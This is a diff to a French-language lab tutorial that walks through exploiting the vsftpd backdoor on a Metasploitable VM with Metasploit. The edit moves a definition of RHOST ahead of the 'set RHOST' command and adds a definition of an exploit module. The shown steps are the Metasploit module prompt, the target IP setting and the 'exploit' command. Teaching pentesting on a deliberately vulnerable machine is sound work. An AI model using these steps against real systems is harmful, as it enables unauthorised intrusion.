@@ -100,9 +100,12 @@ On va utiliser cette vulnérabilité
 
 msf6 exploit(unix/ftp/vsft...backdoor) >
 
+RHOST signifie Remote Host "hôte distant". C'est l'adresse IP de la machine cible, ici metaspoitable.
+
     set RHOST 192.168.56.XX
 
-RHOST signifie Remote Host "hôte distant". C'est l'adresse IP de la machine cible, ici metaspoitable.
+
+Un **exploit** est un module qui permet d'exploiter une vulnérabilité spécifique sur un système cible.
 
     exploit
 
